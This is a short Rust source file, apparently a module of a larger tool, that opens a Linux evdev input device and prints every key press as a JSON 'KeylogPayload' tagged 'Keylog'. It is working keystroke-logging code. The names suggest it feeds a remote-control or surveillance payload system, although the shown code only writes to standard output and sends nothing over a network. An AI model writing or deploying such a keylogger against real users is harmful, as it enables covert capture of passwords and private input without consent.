use crate::{Op, payloads::KeylogPayload};
use evdev::{Device, EventType};
use std::{error::Error, io::Write, path::Path};

pub fn listen<P: AsRef<Path>>(dev_file: P) -> Result<(), Box<dyn Error>> {
    let mut device = Device::open(&dev_file)?;

    loop {
        for event in device.fetch_events()? {
            if event.event_type() == EventType::KEY && event.value() == 1 {
                let payload = KeylogPayload {
                    op: Op::Keylog,
                    code: event.code(),
                };

                println!("{}", serde_json::to_string(&payload).unwrap());
            }
        }
    }
}
